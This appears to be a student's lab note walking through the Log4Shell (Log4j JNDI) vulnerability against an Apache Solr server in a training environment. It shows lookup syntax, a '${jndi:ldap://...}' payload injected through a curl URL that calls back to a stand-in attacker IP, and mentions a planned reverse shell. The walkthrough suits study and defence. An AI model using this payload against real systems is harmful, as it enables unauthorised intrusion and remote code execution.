---
title: Proof Of Concept
updated: 2022-06-07 14:10:14Z
created: 2022-06-07 13:44:30Z
---

so what is the problem here ?

the problem here is that  log4j package adds some extra logic to their logs by parsing entries.

-\> to enrich the data

but the problem begins when it take actions and even evaluate code based of this data entry

Some examples of this syntax are:

- [ ] \- `${sys:os.name}`
- [ ] \- `${sys:user.name}`
- [ ] \- `${log4j:configParentLocation}`
- [ ] \- `${ENV:PATH}`
- [ ] \- `${ENV:HOSTNAME}`
- [ ] \- `${java:version}`

general payload for exploiting log4j is done using jndi(java naming and directory interface)

**${jndi:ldap://ATTACKERCONTROLLEDHOST}**

this jndi and ldap is used to ultimately access external resources or references , which is what we will weaponize in this attack

so lets create a proof of concept lets start a listener on netcat and make the attack machine to connect to us :

![2a4326980b1f5d4ee26c0943b7e5f89c.png](../_resources/2a4326980b1f5d4ee26c0943b7e5f89c.png)

our payload will look something like this :

'[http://10.10.135.28:8983/solr/admin/cores?foo=$\\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:9999\\}](http://10.10.135.28:8983/solr/admin/cores?foo=$%5C%7Bjndi:ldap://YOUR.ATTACKER.IP.ADDRESS:9999%5C%7D)'

let me make this a bit easy to understand so first we are visiting our apache solr web-server address and port ,

-\> then in solr/admin/cores directory ,

->then we passed a ? to make  a parameter for us , we named our parameter "foo"

->then used "=" sign to define our parameter ,

->we used jndi to connect to a LDAP service , which is our listener on netcat on port 9999 and

->for some housekeeping stuff we made our payload inside single quotes so that bash do not interpret "$" sign as a variable

-\> we also used backslashes "\\" to escape curly braces character "{}" , so that they are not misinterpreted by curl as curl command arguments. 

lets forward this payload using curl : 

![1dec3c855c3bbddfef250a93471e0dad.png](../_resources/1dec3c855c3bbddfef250a93471e0dad.png)

and we will get some weird characters and a connection back from the target machine : 

![f0dc179eaf8470ec03f2c90bfee23d4b.png](../_resources/f0dc179eaf8470ec03f2c90bfee23d4b.png)

this proofs that yes we achieved remote code execution on our target machine .

now as this was ldap protocol we did not get a shell but in further steps we will work on that to get a shell and gain a reverse shell from target machine .